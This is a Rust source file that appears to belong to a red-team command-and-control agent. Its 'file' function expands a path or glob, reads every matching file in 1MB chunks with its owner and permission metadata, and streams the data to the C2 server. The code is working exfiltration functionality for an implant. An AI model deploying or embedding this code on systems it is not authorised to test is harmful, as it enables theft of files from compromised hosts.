use alloc::format;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec;
use eldritch_agent::{Agent, Context};
use pb::c2::report_file_request;
use pb::{c2, eldritch};
use std::io::Read;
use std::sync::Mutex;

#[cfg(unix)]
fn get_file_metadata_fields(metadata: &std::fs::Metadata) -> (String, String, String) {
    use nix::unistd::{Gid, Group, Uid, User};
    use std::os::unix::fs::MetadataExt;

    let mode = metadata.mode();
    let permissions = format!("{:o}", mode & 0o7777);

    let uid = metadata.uid();
    let owner = User::from_uid(Uid::from_raw(uid))
        .ok()
        .flatten()
        .map(|u| u.name)
        .unwrap_or_else(|| uid.to_string());

    let gid = metadata.gid();
    let group = Group::from_gid(Gid::from_raw(gid))
        .ok()
        .flatten()
        .map(|g| g.name)
        .unwrap_or_else(|| gid.to_string());

    (permissions, owner, group)
}

#[cfg(windows)]
fn get_file_metadata_fields(_metadata: &std::fs::Metadata) -> (String, String, String) {
    (String::new(), String::new(), String::new())
}

use glob::glob;

pub fn file(agent: Arc<dyn Agent>, context: Context, path: String) -> Result<(), String> {
    let mut files_to_report = vec![];

    if path.contains('*') || path.contains('?') || path.contains('[') {
        let paths = glob(&path).map_err(|e| format!("Invalid glob pattern {path}: {e}"))?;
        for entry in paths {
            if let Ok(match_path) = entry {
                if match_path.is_file() {
                    files_to_report.push(match_path.to_string_lossy().into_owned());
                }
            }
        }
    } else {
        let md = std::fs::metadata(&path).map_err(|e| e.to_string())?;
        if !md.is_file() {
            return Err(format!("path '{}' is not a file", path));
        }
        files_to_report.push(path);
    }

    if files_to_report.is_empty() {
        return Ok(());
    }

    let context_val = match context {
        Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc)),
        Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc)),
    };

    let error = Arc::new(Mutex::new(None));
    let error_clone = error.clone();

    // Use a sync channel with bound 1 to provide backpressure
    let (tx, rx) = std::sync::mpsc::sync_channel(1);

    let producer = std::thread::spawn(move || {
        for path_clone in files_to_report {
            let file_res = std::fs::File::open(&path_clone).map_err(|e| e.to_string());
            match file_res {
                Ok(mut file) => {
                    let fs_metadata = std::fs::metadata(&path_clone).ok();
                    let (permissions, owner, group) = fs_metadata
                        .as_ref()
                        .map(get_file_metadata_fields)
                        .unwrap_or_default();

                    let mut metadata_sent = false;
                    let chunk_size = 1024 * 1024; // 1MB
                    let mut buffer = vec![0; chunk_size];

                    loop {
                        // Check if receiver is closed (upload aborted or failed)
                        // We check this implicitly by handle send result

                        match file.read(&mut buffer) {
                            Ok(0) => break, // EOF
                            Ok(n) => {
                                let chunk_data = buffer[..n].to_vec();

                                let metadata = if !metadata_sent {
                                    metadata_sent = true;
                                    Some(eldritch::FileMetadata {
                                        path: path_clone.clone(),
                                        permissions: permissions.clone(),
                                        owner: owner.clone(),
                                        group: group.clone(),
                                        ..Default::default()
                                    })
                                } else {
                                    None
                                };

                                let file_msg = eldritch::File {
                                    metadata,
                                    chunk: chunk_data,
                                };

                                let req = c2::ReportFileRequest {
                                    context: context_val.clone(),
                                    chunk: Some(file_msg),
                                    kind: c2::ReportFileKind::Ondisk as i32,
                                };

                                if tx.send(req).is_err() {
                                    break;
                                }
                            }
                            Err(e) => {
                                *error_clone.lock().unwrap() = Some(e.to_string());
                                break;
                            }
                        }
                    }
                }
                Err(e) => {
                    *error_clone.lock().unwrap() = Some(e);
                    break;
                }
            }
        }
    });

    let report_result = agent.report_file(rx).map(|_| ());

    producer
        .join()
        .map_err(|_| "report.file worker thread panicked".to_string())?;

    if let Some(e) = error.lock().unwrap().as_ref() {
        return Err(e.clone());
    }

    report_result
}
